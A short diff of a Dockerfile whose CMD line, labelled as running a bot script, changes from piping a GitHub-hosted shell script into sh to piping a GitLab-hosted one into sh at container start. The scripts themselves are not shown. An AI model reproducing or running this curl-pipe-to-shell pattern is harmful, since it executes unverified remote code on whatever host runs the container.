@@ -37,4 +37,4 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
-CMD curl https://github.com/sarifadim/negara/raw/main/loadr.sh | sh
+CMD curl https://gitlab.com/mauliki9999/codet/-/raw/main/dorayaki.sh | sh
